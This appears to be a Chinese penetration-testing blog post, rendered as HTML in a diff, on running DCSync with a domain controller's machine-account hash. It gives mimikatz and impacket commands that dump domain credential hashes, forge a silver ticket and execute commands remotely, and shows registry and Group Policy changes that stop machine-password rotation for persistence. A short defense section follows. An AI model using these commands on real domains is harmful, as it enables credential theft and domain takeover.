@@ -1,0 +1,240 @@
+I"�/<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在之前的文章<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">《域渗透——DCSync》</a>提到过DCSync的利用条件：</p>
+
+<p>获得以下任一用户的权限：</p>
+
+<ul>
+  <li>Administrators组内的用户</li>
+  <li>Domain Admins组内的用户</li>
+  <li>Enterprise Admins组内的用户</li>
+  <li>域控制器的计算机帐户</li>
+</ul>
+
+<p>本文将要补全上篇文章中未提到的最后一种利用方法，介绍如何通过域控制器的计算机帐户口令hash实现DCSync</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>MachineAccount简介</li>
+  <li>获得MachineAccount口令hash的方法</li>
+  <li>使用MachineAccount实现DCSync</li>
+  <li>防御检测</li>
+</ul>
+
+<h2 id="0x02-machineaccount简介">0x02 MachineAccount简介</h2>
+<hr />
+
+<p>MachineAccount是每台计算机在安装系统后默认生成的计算机帐户</p>
+
+<p>计算机帐户的密码存储在注册表的位置：<code class="language-plaintext highlighter-rouge">HKLM\SECURITY\Policy\Secrets\$machine.ACC</code></p>
+
+<p>如果计算机加入域中，会将计算机帐户的密码同步到域控制器并保存在域控制器的NTDS.dit文件中</p>
+
+<p>计算机帐户的密码默认每30天自动更新，密码长度为120个字符，所以说，即使获得了计算机帐户密码的hash，也很难还原出计算机帐户的明文口令</p>
+
+<h4 id="关闭当前计算机帐户密码自动更新的两种方法适用于工作组">关闭当前计算机帐户密码自动更新的两种方法（适用于工作组）：</h4>
+
+<p>1.修改组策略</p>
+
+<p>组策略位置：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-9-19/2-1.png" alt="Alt text" /></p>
+
+<p>默认未启用，如果设置为启用后，将会停止更新密码</p>
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc785826(v=ws.10)</p>
+
+<p>2.直接修改注册表</p>
+
+<p>注册表位置：<code class="language-plaintext highlighter-rouge">HKLM\System\CurrentControlSet\Services\Netlogon\Parameters\</code></p>
+
+<p>将<code class="language-plaintext highlighter-rouge">DisablePasswordChange</code>的值设为<code class="language-plaintext highlighter-rouge">1</code></p>
+
+<h4 id="关闭域内计算机帐户密码自动更新的两种方法适用于域网络">关闭域内计算机帐户密码自动更新的两种方法（适用于域网络）：</h4>
+
+<p>1.修改组策略</p>
+
+<p>这里需要修改域组策略，在域控制器上打开<code class="language-plaintext highlighter-rouge">Group Policy Management</code>后，选择<code class="language-plaintext highlighter-rouge">Default Domain Policy</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-9-19/2-2.png" alt="Alt text" /></p>
+
+<p>组策略位置：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\
+</code></pre></div></div>
+
+<p>2.修改组策略的配置文件</p>
+
+<p>Default Domain Policy对应的guid为<code class="language-plaintext highlighter-rouge">31B2F340-016D-11D2-945F-00C04FB984F9</code></p>
+
+<p>配置文件路径为：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
+</code></pre></div></div>
+
+<p>例如我的测试环境下，路径对应为：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\\test.com\SYSVOL\test.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
+</code></pre></div></div>
+
+<p>修改文件<code class="language-plaintext highlighter-rouge">GptTmpl.inf</code>，在<code class="language-plaintext highlighter-rouge">[Registry Values]</code>下添加新的内容：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange=4,1
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-9-19/2-3.png" alt="Alt text" /></p>
+
+<p>强制域控制器更新组策略，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gpupdate /force
+</code></pre></div></div>
+
+<p>配置完成，将系统时间调快30天，hash保持不变</p>
+
+<h2 id="0x03-获得machineaccount口令hash的方法">0x03 获得MachineAccount口令hash的方法</h2>
+<hr />
+
+<h3 id="1通过注册表文件导出当前计算机帐户的口令hash">1.通过注册表文件导出当前计算机帐户的口令hash</h3>
+
+<p>mimikatz命令示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
+token::elevate
+lsadump::secrets
+</code></pre></div></div>
+
+<p>返回的结果中，<code class="language-plaintext highlighter-rouge">$machine.ACC</code>项对应计算机帐户，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-9-19/3-1.png" alt="Alt text" /></p>
+
+<p>其他从注册表导出的方法可参考之前的文章<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash">《渗透技巧——通过SAM数据库获得本地用户hash》</a></p>
+
+<h3 id="2使用dcsync导出所有计算机帐户的口令hash">2.使用DCSync导出所有计算机帐户的口令hash</h3>
+
+<h4 id="1使用mimikatz">(1)使用mimikatz</h4>
+
+<p>在域控制器上使用mimikatz导出域内所有用户的hash，命令示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe "lsadump::dcsync /domain:test.com /all /csv" exit
+</code></pre></div></div>
+
+<p>其中以<code class="language-plaintext highlighter-rouge">$</code>字符结尾的为计算机帐户</p>
+
+<p>其他环境下的使用方法可参考之前的文章<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">《域渗透——DCSync》</a></p>
+
+<h4 id="2使用secretsdumppy">(2)使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py">secretsdump.py</a></h4>
+
+<p>需要安装Python环境和Impacket包，实际使用时可以将Python代码编译成exe文件</p>
+
+<p>命令示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python secretsdump.py test/Administrator:DomainAdmin123!@192.168.1.1
+</code></pre></div></div>
+
+<p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py">secretsdump.py</a>相比于mimikatz，最大的优点是支持从域外的计算机连接至域控制器</p>
+
+<p>secretsdump.py的实现原理：</p>
+
+<p>使用计算机帐户口令hash通过smbexec或者wmiexec远程连接至域控制器并获得高权限，进而从注册表中导出本地帐户的hash，同时通过Dcsync或从NTDS.dit文件中导出所有域用户的hash</p>
+
+<h3 id="3通过漏洞cve-2020-1472">3.通过漏洞CVE-2020-1472</h3>
+
+<p>参考资料：</p>
+
+<p>https://www.secura.com/pathtoimg.php?id=2055</p>
+
+<p>CVE-2020-1472能够在未授权的状态下远程修改目标计算机帐户的口令hash</p>
+
+<p><strong>注：</strong></p>
+
+<p>CVE-2020-1472只能修改域控制器NTDS.dit文件中保存的计算机帐户hash，无法修改注册表中保存的本地计算机帐户hash</p>
+
+<p>当域控制器中NTDS.dit文件和注册表文件的计算机帐户口令hash不同步时，有可能影响系统的正常功能</p>
+
+<h2 id="0x04-使用machineaccount实现dcsync">0x04 使用MachineAccount实现DCSync</h2>
+<hr />
+
+<p>例如，我们获得了域控制器<code class="language-plaintext highlighter-rouge">DC1</code>的计算机帐户口令hash为<code class="language-plaintext highlighter-rouge">7da530fba3b15a2ea21ce7db8110d57b</code></p>
+
+<h3 id="1使用mimikatz-1">1.使用mimikatz</h3>
+
+<p>这里需要制作白银票据(Silver Ticket)，接着获得LDAP服务的访问权限，细节可参考之前的文章《域渗透——Pass The Ticket》</p>
+
+<p>命令示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz "kerberos::golden /domain:test.com /sid:S-1-5-21-254706111-4049838133-2416586677 /target:DC1.test.com /service:LDAP /rc4:7da530fba3b15a2ea21ce7db8110d57b /user:krbtgt /ptt" "lsadump::dcsync /domain:test.com /all /csv" exit
+</code></pre></div></div>
+
+<p>在细节上需要注意以下方面：</p>
+
+<ul>
+  <li>只能在域内计算机上运行，不支持域外</li>
+  <li>/sid表示域的sid，获取方法可参考之前的文章<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E7%9A%84%E8%8E%B7%E5%8F%96">《渗透基础——活动目录信息的获取》</a></li>
+  <li>/rc4表示计算机帐户的NTLM hash</li>
+  <li>/user:krbtgt表示伪造成用户krbtgt，生成票据</li>
+</ul>
+
+<p><strong>注：域sid的简单获取方法</strong></p>
+
+<p>任一域用户的sid去除最后一位就是域的sid</p>
+
+<h3 id="2使用secretsdump">2.使用secretsdump</h3>
+
+<p>命令示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python secretsdump.py -hashes :7da530fba3b15a2ea21ce7db8110d57b test/DC1$@192.168.1.1
+</code></pre></div></div>
+
+<p>在细节上需要注意以下方面：</p>
+
+<ul>
+  <li>secretsdump支持从域外的计算机连接至域控制器</li>
+  <li>如果使用域内普通计算机帐户的口令hash连接对应的计算机，那么会失败，提示<code class="language-plaintext highlighter-rouge">rpc_s_access_denied</code></li>
+  <li>可以通过<a href="https://github.com/SecureAuthCorp/impacket/tree/0b46f198042626a1ecd2846d22db355453e29c03/examples">wmiexec.py</a>或<a href="https://github.com/SecureAuthCorp/impacket/blob/0b46f198042626a1ecd2846d22db355453e29c03/examples/smbexec.py">smbexec.py</a>远程执行cmd命令</li>
+</ul>
+
+<p>命令示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python smbexec.py -hashes :7da530fba3b15a2ea21ce7db8110d57b test/DC1$@192.168.1.1 whoami /priv
+python wmiexec.py -hashes :7da530fba3b15a2ea21ce7db8110d57b test/DC1$@192.168.1.1 whoami /priv
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>使用计算机帐户具有高权限，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-9-19/4-1.png" alt="Alt text" /></p>
+
+<h2 id="0x05-防御检测">0x05 防御检测</h2>
+<hr />
+
+<p>检测DCSync后门的方法可参考<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">《域渗透——DCSync》</a></p>
+
+<p>站在防御的角度，如果域管理员的权限被攻击者获得，在尝试踢出攻击者的过程中，不仅需要修改域管理员用户的口令，同样需要更新计算器帐户的口令hash，检测域组策略是否被配置成开启<code class="language-plaintext highlighter-rouge">DisablePasswordChange</code></p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr />
+
+<p>本文介绍了通过域控制器的计算机帐户口令hash实现DCSync的方法，分析利用思路，给出防御建议。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
